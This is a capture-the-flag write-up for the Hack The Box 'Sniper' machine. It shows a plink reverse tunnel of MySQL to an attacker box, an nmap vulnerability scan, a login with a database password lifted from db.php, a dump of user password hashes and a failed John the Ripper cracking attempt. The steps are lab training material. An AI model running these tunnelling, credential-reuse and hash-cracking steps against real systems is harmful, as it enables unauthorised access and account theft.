# Enumerating MySQL DB

Forward the MySQL port back to Kali

```text
PS C:\Temp> .\plink64.exe -P 22022 -l root -pw <pw> -R 3306:127.0.0.1:3306 10.10.14.78
.\plink64.exe -P 22022 -l root -pw <pw> -R 3306:127.0.0.1:3306 10.10.14.78
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 6e:8b:15:36:77:7e:5e:c0:b2:25:8f:b5:74:68:32:df
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y
Using username "root".
Linux kali 5.3.0-kali2-amd64 #1 SMP Debian 5.3.9-3kali1 (2019-11-20) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Feb 15 23:07:56 2021 from 192.168.92.1
root@kali:~#
```

Then we check if its running and try an nmap scan against it

```text
root@kali:~/CTF/HTB/Sniper# netstat -ant | grep 3306
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp6       0      0 ::1:3306                :::*                    LISTEN


root@kali:~/CTF/HTB/Sniper# nmap -Pn -n -sV -p3306 --script=vuln,discovery 127.0.0.1
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 23:56 +08
Pre-scan script results:
| broadcast-igmp-discovery:
|   192.168.92.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.251
|     Description: mDNS (rfc6762)
|   192.168.92.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.252
|     Description: Link-local Multicast Name Resolution (rfc4795)
|_  Use the newtargets script-arg to add the results as targets
| broadcast-ping:
|   IP: 192.168.92.2  MAC: 00:50:56:fc:70:be
|_  Use --script-args=newtargets to add the results as targets
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| ipv6-multicast-mld-list:
|   fe80::b041:cdc8:aed5:1dee:
|     device: eth0
|     mac: 00:50:56:c0:00:08
|     multicast_ips:
|       ff02::1:ffd5:1dee         (NDP Solicited-node)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:ff1e:27b0         (Solicited-Node Address)
|       ff02::1:ff1e:27b0         (Solicited-Node Address)
|       ff02::fb                  (mDNSv6)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff15::efc0:988f           (unknown)
|       ff02::c                   (SSDP)
|_      ff02::1:3                 (Link-local Multicast Name Resolution)
| targets-asn:
|_  targets-asn.asn is a mandatory parameter
| targets-ipv6-multicast-mld:
|   IP: fe80::b041:cdc8:aed5:1dee  MAC: 00:50:56:c0:00:08  IFACE: eth0
|
|_  Use --script-args=newtargets to add the results as targets
| targets-ipv6-multicast-slaac:
|   IP: fe80::b041:cdc8:aed5:1dee  MAC: 00:50:56:c0:00:08  IFACE: eth0
|   IP: fe80::a51b:6fc5:e41e:27b0  MAC: 00:50:56:c0:00:08  IFACE: eth0
|_  Use --script-args=newtargets to add the results as targets
sendto in send_ip_packet_sd: sendto(5, packet, 65536, 0, 127.0.0.1, 16) => Message too long
Offending packet: TCP 127.0.0.1:39601 > 127.0.0.1:3306 S ttl=128 id=0 iplen=0  seq=2019520492 win=3072 <mss 1460>
Nmap scan report for 127.0.0.1
Host is up (0.000077s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.15
|_banner: J\x00\x00\x00\x0A8.0.15\x00\x15\x00\x00\x00\x193\x17jcL#\x0A...
| mysql-info:
|   Protocol: 10
|   Version: 8.0.15
|   Thread ID: 24
|   Capabilities flags: 65535
|   Some Capabilities: LongColumnFlag, SupportsTransactions, InteractiveClient, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, IgnoreSigpipes, LongPassword, Support41Auth, SupportsCompression, FoundRows, Speaks41ProtocolNew, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, ODBCClient, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x0B\x06aEtBP?OuXCOn]\x07b~gd
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.15_Auto_Generated_Server_Certificate
| Not valid before: 2019-04-12T05:17:18
|_Not valid after:  2029-04-09T05:17:18
|_ssl-date: TLS randomness does not represent time
| ssl-enum-ciphers:
|   TLSv1.0:
|     ciphers:
|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 2048) - A
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 2048) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A
|     compressors:
|       NULL
|     cipher preference: client
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|   TLSv1.1:
|     ciphers:
|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 2048) - A
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 2048) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A
|     compressors:
|       NULL
|     cipher preference: client
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|   TLSv1.2:
|     ciphers:
|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 2048) - A
|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 (dh 2048) - A
|       TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 (dh 2048) - A
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 2048) - A
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 (dh 2048) - A
|       TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 (dh 2048) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_128_CBC_SHA256 (rsa 2048) - A
|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA256 (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A
|     compressors:
|       NULL
|     cipher preference: client
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|_  least strength: C
|_sslv2-drown:

Host script results:
|_dns-brute: Can't guess domain of "127.0.0.1"; use dns-brute.domain script argument.
|_fcrdns: PASS (localhost)
|_ipidseq: All zeros
|_path-mtu: 65535 <= PMTU < 65536

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.41 seconds
```

The password for login works from db.php works and we can get the hashes

```text
root@kali:~/CTF/HTB/Sniper# mysql -u dbuser -p36mEAhz/B8xQ~2VM -h 127.0.0.1
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1616
Server version: 8.0.15 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| sniper             |
+--------------------+
2 rows in set (0.015 sec)

MySQL [(none)]> use sniper;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [sniper]> show tables;
+------------------+
| Tables_in_sniper |
+------------------+
| users            |
+------------------+
1 row in set (0.008 sec)

MySQL [sniper]> select * from users;
+----+-----------+-----------------------+----------------------------------+---------------------+
| id | username  | email                 | password                         | trn_date            |
+----+-----------+-----------------------+----------------------------------+---------------------+
|  1 | superuser | admin@sniper.co       | 6e573c8b25e9168e0c61895d821a3d57 | 2019-04-11 22:45:36 |
|  8 | attacker  | attacker@attacker.com | 5f4dcc3b5aa765d61d8327deb882cf99 | 2021-02-15 11:40:25 |
+----+-----------+-----------------------+----------------------------------+---------------------+
2 rows in set (0.006 sec)
```

But I couldn't crack it with john on WSL

```text
ivan@Laptop:/**********************/HTB/Sniper$ cat admin.hash
superuser:6e573c8b25e9168e0c61895d821a3d57

ivan@Laptop:/**********************/HTB/Sniper$ /opt/john/run/john --wordlist=/opt/Seclists/rockyou.txt --rules admin.hash
Warning: detected hash type "LM", but the string is also recognized as "dynamic=md5($p)"
Use the "--format=dynamic=md5($p)" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "HAVAL-128-4"
Use the "--format=HAVAL-128-4" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "MD2"
Use the "--format=MD2" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "mdc2"
Use the "--format=mdc2" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "mscash"
Use the "--format=mscash" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "mscash2"
Use the "--format=mscash2" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "NT"
Use the "--format=NT" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "Raw-MD4"
Use the "--format=Raw-MD4" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "Raw-MD5"
Use the "--format=Raw-MD5" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "Raw-MD5u"
Use the "--format=Raw-MD5u" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "ripemd-128"
Use the "--format=ripemd-128" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "Snefru-128"
Use the "--format=Snefru-128" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "ZipMonster"
Use the "--format=ZipMonster" option to force loading these as that type instead
Using default input encoding: UTF-8
Using default target encoding: CP850
Loaded 2 password hashes with no different salts (LM [DES 256/256 AVX2])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:16 DONE (2021-02-16 00:09) 0g/s 4454Kp/s 4454Kc/s 8909KC/s *..MOS!
Session completed.
ivan@Laptop:/**********************/HTB/Sniper$ /opt/john/run/john --wordlist=/opt/Seclists/rockyou.txt --format=raw-md5 --rules admin.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:33 DONE (2021-02-16 00:10) 0g/s 7003Kp/s 7003Kc/s 7003KC/s Aarlovering..Aaaaaaaaaaaaing
Session completed.
```

